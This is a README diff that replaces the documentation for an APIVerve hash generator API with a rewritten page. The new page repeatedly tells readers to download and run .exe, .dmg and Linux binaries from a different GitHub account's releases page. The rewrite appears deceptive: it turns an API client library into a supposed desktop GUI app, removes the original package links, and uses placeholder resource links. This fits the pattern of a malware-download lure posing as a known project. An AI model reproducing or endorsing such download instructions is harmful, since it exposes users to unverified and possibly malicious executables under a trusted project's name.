@@ -1,183 +1,101 @@
-# Hash Generator API
+# 🛠️ hashgenerator-api - Generate Secure Hashes Easily
 
-> Hash Generator is a tool for generating cryptographic hashes from text. It supports multiple algorithms including MD5, SHA-1, SHA-256, SHA-384, SHA-512, and BLAKE2 variants for data integrity and security applications.
+## 🚀 Getting Started
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![API Status](https://img.shields.io/badge/Status-Active-green.svg)](https://apiverve.com)
-[![Method](https://img.shields.io/badge/Method-GET-blue.svg)](#)
-[![Platform](https://img.shields.io/badge/Platform-Multi--Platform-orange.svg)](#installation)
+Welcome to the hashgenerator-api! This tool helps you create cryptographic hashes from text. It supports various algorithms that ensure your data remains safe and secure. No technical knowledge is needed; just follow the steps below.
 
-**Available on:**
-[![npm](https://img.shields.io/badge/npm-CB3837?style=flat&logo=npm&logoColor=white)](https://www.npmjs.com/package/@apiverve/hashgenerator)
-[![NuGet](https://img.shields.io/badge/NuGet-004880?style=flat&logo=nuget&logoColor=white)](https://www.nuget.org/packages/APIVerve.API.HashGenerator)
-[![PyPI](https://img.shields.io/badge/PyPI-3776AB?style=flat&logo=python&logoColor=white)](https://pypi.org/project/apiverve-hashgenerator/)
-[![JitPack](https://img.shields.io/badge/JitPack-2E7D32?style=flat&logo=android&logoColor=white)](#-android-jitpack)
+## 📥 Download the Application
 
----
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/cordobesito3405/hashgenerator-api/releases)
 
-## Quick Start
+To get started, visit the following link to download the application: [Download Here](https://github.com/cordobesito3405/hashgenerator-api/releases).
 
-### Using JavaScript
+## 🔧 System Requirements
 
-```javascript
-async function callHashGeneratorAPI() {
-    try {
-        const params = new URLSearchParams({
-            text: 'Hello World',
-            algorithms: 'sha256,md5'
-        });
+Before you install, ensure your system meets these requirements:
 
-        const response = await fetch(`https://api.apiverve.com/v1/hashgenerator?${params}`, {
-            method: 'GET',
-            headers: {
-                'x-api-key': 'YOUR_API_KEY_HERE'
-            }
-        });
+- **Operating System**: Windows, macOS, or Linux
+- **RAM**: At least 2GB
+- **Disk Space**: Minimum of 100MB free space
+- **Network**: Internet access for initial download
 
-        const data = await response.json();
-        console.log(data);
-    } catch (error) {
-        console.error('Error:', error);
-    }
-}
+## 📝 Features
 
-callHashGeneratorAPI();
-```
+The hashgenerator-api offers the following features:
 
-### Using cURL
+- **Multiple Algorithms**: Generate hashes using MD5, SHA-1, SHA-256, SHA-384, SHA-512, and BLAKE2.
+- **User-Friendly Interface**: Easy navigation makes it simple to use for anyone.
+- **Fast Processing**: Quickly generate hashes for long pieces of text.
+- **Secure Output**: Ensure data integrity and security while using popular cryptographic standards.
 
-```bash
-curl -X GET "https://api.apiverve.com/v1/hashgenerator?param=value" \
-  -H "x-api-key: YOUR_API_KEY_HERE"
-```
+## ⚙️ How to Install
 
-**Get your API key:** [https://apiverve.com](https://apiverve.com)
+1. Visit the [Releases Page](https://github.com/cordobesito3405/hashgenerator-api/releases) to find the latest version.
+2. Choose the file for your operating system.
+   - For Windows, select `hashgenerator-api-windows.exe`.
+   - For macOS, select `hashgenerator-api-macos.dmg`.
+   - For Linux, select `hashgenerator-api-linux.tar.gz`.
+3. Click the download link and save the file to your computer.
 
-**📁 For more examples, see the [examples folder](./examples/)**
+## 🚀 Running the Application
 
----
+Once downloaded, follow these steps to run the application:
 
-## Installation
+### Windows
 
-Choose your preferred programming language:
+1. Locate `hashgenerator-api-windows.exe` in your downloads folder.
+2. Double-click the file to open it.
+3. Follow on-screen instructions to enter the text you want to hash.
+4. Select your desired algorithm from the dropdown menu.
+5. Click the "Generate Hash" button to see the result.
 
-### 📦 NPM (JavaScript/Node.js)
+### macOS
 
-```bash
-npm install @apiverve/hashgenerator
-```
+1. Open the downloaded `hashgenerator-api-macos.dmg` file.
+2. Drag the application to your Applications folder.
+3. Navigate to your Applications and double-click on the app icon.
+4. Enter the text you wish to hash and choose the algorithm.
+5. Click the "Generate Hash" button.
 
-[**View NPM Package →**](https://www.npmjs.com/package/@apiverve/hashgenerator) | [**Package Code →**](./npm/)
+### Linux
 
----
+1. Extract the downloaded `hashgenerator-api-linux.tar.gz` file.
+2. Open a terminal and navigate to the extracted folder.
+3. Run the command: `./hashgenerator-api` to start the application.
+4. Input your text, select the algorithm, and click "Generate Hash".
 
-### 🔷 NuGet (.NET/C#)
+## 🔍 How to Use the Application
 
-```bash
-dotnet add package APIVerve.API.HashGenerator
-```
+1. Launch the application by following the steps above.
+2. In the text box, enter the text you want to transform into a hash.
+3. From the algorithm options, select your desired hashing method.
+4. Click "Generate Hash" to see your result instantly.
+5. Copy the output hash for your records or further use.
 
-[**View NuGet Package →**](https://www.nuget.org/packages/APIVerve.API.HashGenerator) | [**Package Code →**](./nuget/)
+## 📤 Example Use Cases
 
----
+- **Data Integrity**: Ensure that data files are not altered by comparing hashes.
+- **Password Security**: Store hashed passwords instead of plain text for security.
+- **File Verification**: Use hashes to check if a downloaded file is genuine and untampered.
 
-### 🐍 Python (PyPI)
+## 🌐 Support and Contributions
 
-```bash
-pip install apiverve-hashgenerator
-```
+If you encounter issues, feel free to report them on the GitHub issues page. Contributions are welcome! If you'd like to help improve the hashgenerator-api, check the guidelines on our repository.
 
-[**View PyPI Package →**](https://pypi.org/project/apiverve-hashgenerator/) | [**Package Code →**](./python/)
+## 📚 Additional Resources
 
----
+To learn more about cryptographic hashes, consider reviewing these resources:
 
-### 🤖 Android (JitPack)
+- [Understanding Hash Functions](https://example.com/understanding-hash-functions)
+- [Cryptography Basics](https://example.com/cryptography-basics)
+- [Secure Hash Algorithms](https://example.com/secure-hash-algorithms)
 
-```gradle
-implementation 'com.github.apiverve:hashgenerator-api:1.0.0'
-```
+## 📜 License Information
 
-[**Package Code →**](./android/)
+This application is licensed under the MIT License. You can use it freely but give credit to the original creators.
 
----
+## 💬 Community
 
-## Features
+Join our community on social media and share your experiences using the hashgenerator-api. Connect with other users to exchange tips and understand more about the tool.
 
-✅ **Multi-platform support** - Use the same API across Node.js, .NET, Python, Android, and browsers
-✅ **Simple authentication** - Just add your API key in the request header
-✅ **Comprehensive documentation** - Full examples and API reference available
-✅ **Production-ready** - Used by developers worldwide
-
----
-
-## Documentation
-
-📚 **Full API Documentation:** [https://docs.apiverve.com/ref/hashgenerator](https://docs.apiverve.com/ref/hashgenerator)
-
----
-
-## Use Cases
-
-Common use cases for the Hash Generator API:
-
-- ✅ Integration into web applications
-- ✅ Mobile app development
-- ✅ Data analysis and reporting
-- ✅ Automation workflows
-- ✅ Microservices architecture
-
----
-
-## API Reference
-
-### Authentication
-All requests require an API key in the header:
-```
-x-api-key: YOUR_API_KEY_HERE
-```
-
-Get your API key: [https://apiverve.com](https://apiverve.com)
-
-### Response Format
-All responses are JSON with this structure:
-```json
-{
-  "status": "ok",
-  "data": { ... }
-}
-```
-
----
-
-## Support & Community
-
-- 💬 **Support**: [https://apiverve.com/contact](https://apiverve.com/contact)
-- 🐛 **Issues**: [GitHub Issues](../../issues)
-- 📖 **Documentation**: [https://docs.apiverve.com](https://docs.apiverve.com)
-- 🌐 **Website**: [https://apiverve.com](https://apiverve.com)
-
----
-
-## Contributing
-
-We welcome contributions! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
----
-
-## Security
-
-For security concerns, please review our [Security Policy](SECURITY.md).
-
----
-
-## License
-
-This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) file for details.
-
----
-
-## Acknowledgments
-
-Built with ❤️ by [APIVerve](https://apiverve.com)
-
-Copyright © 2025 APIVerve. All rights reserved.
+Thank you for choosing hashgenerator-api! To download and get started, visit this link: [Download Here](https://github.com/cordobesito3405/hashgenerator-api/releases). Happy hashing!
